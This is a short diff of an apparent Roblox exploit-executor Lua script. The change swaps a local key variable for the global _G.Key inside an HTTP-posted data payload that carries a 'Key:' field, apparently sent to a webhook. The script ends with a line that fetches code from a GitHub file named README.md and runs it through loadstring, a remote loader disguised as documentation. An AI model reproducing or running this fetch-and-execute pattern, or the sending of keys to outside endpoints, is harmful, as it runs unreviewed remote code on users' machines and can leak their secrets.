@@ -1,5 +1,4 @@
 
-key = "_G.Key"
 local http_request = http_request or request or HttpPost or syn.request
 
 local getservice = game.GetService
@@ -49,7 +48,7 @@ local data = {
                },
                {
                   ["name"] = "Key:",
-                  ["value"] = key,
+                  ["value"] = _G.Key,
                   ["inline"] = true
                },
                {
@@ -1485,4 +1484,3 @@ end)
 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MAZIHUB191/FPS-SHOW/main/README.md"))() 
-
